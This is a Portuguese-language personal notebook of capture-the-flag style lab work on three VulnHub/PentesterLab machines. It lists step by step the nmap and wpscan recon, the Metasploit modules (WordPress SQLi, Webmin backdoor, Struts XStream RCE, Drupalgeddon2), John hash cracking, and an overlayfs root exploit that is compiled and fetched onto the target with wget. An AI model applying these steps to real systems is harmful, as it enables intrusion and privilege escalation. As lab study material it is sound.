--VM--
desafio 1 - https://www.vulnhub.com/entry/hacker-fest-2019,378/
desafio 2 - https://pentesterlab.com/exercises/s2-052/course
desafio 3 - https://www.vulnhub.com/entry/droopy-v02,143/
--VM--
  
Dia 1 - desafio 2(1° desafio)     7/9/2020
        *scan com nmap        
        *identificação do wordpress -> wpscan -> pesquisar por exploit dos plugins -> wp_google
        *msfconsole -> auxiliary/admin/http/wp_google_maps_sqli
        *quebrar a hash da senha com John 
                john arquivo_com_hash.txt --wordlist=rockyou.txt
        *searchsploit webmin(etapa 1 com nmap - serviço porta 10000)
                *msfconsole -> search webmin
                *use exploit/linux/http/webmin_backdoor  
                *Set ForceExploit true -> versão do exploit é diferente do seviço, força a execução mesmo assim
                *set ssl true -> não sei pq, talvez seja obrigatório "uso do ssl" 
                *find /root
                        cat flag.txt
                *find /home
                        cat /home/webmaster/flag.txt



Dia 2 - desafio 2(° 2desafio)			8/9/2020
	*Pesquisa sobre “trust” -> vulnerabilidade conhecida -> exploit encontrado: Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution
	
	*varredura da máquina
		nmap -sV
	*execuçaõ do exploit no msfconsole




Dia 3 			9/9/2020
	*Varredura do alvo
		indetificação vulnerabilidade 
			
	*Invasão do alvo
		exploit unix/webapp/drupal_drupalgeddon2
	
	*Escalaçao de privilégios referência CVE 2015-1328
		msf5 search  CVE-2015-1328
			exploit/linux/local/overlayfs_priv_esc
			
			*Manualmente
			locate linux/local/37292.c
			# gcc -o [arquivo saida]  37292.c    (compilar o arquivo qe está em C )
			
			meterpreter: upload [arquivo saida] /tmp
					OU
			meterpreter: shell
			cd /tmp
			wget 192.168.0.1/[arquivo saida]  ↔ baixar o arquivo de um server local
